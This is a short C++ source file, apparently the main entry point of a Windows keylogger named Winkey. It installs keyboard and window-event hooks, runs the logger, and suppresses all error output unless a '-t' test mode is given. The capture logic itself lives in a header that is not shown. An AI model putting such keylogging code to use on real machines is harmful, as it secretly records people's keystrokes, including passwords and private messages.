#include "Winkey.hpp"

/*
 * Check if the test mode has been set.
 * The test mode outputs the key log as a single string,
 * making it easier to compare the log with the expected results.
 */

static bool isTestModeSet(int argc, wchar_t *argv[])
{
    if (argc > 1 && argv[1][0] == L'-')
    {
        if (argv[1][1] == L't')
            return true;
        else
        {
            std::cerr << "Error: Unknown argument.\n";
            exit(1);
        }
    }
    return false;
}

int wmain(int argc, wchar_t *argv[])
{
    Winkey  *w = new Winkey();
    bool    isTestMode = isTestModeSet(argc, argv);

    try {
        // Set the hooks to the window and keyboard events
        w->setHooks();

        // Run the keylogger
        w->run(isTestMode);
    }
    catch (const WinkeyException &e)
    {
        if (isTestMode)
        { // Output errors only while testing
            std::cerr << "Error: " << e.what() << std::endl;
            delete w;
            return 1;
        }
    }
    catch (const std::exception &e)
    {
        if (isTestMode)
            std::cerr << "Error: " << e.what() << std::endl;
        delete w;
        return 1;
    }

    delete w;
    return 0;
}
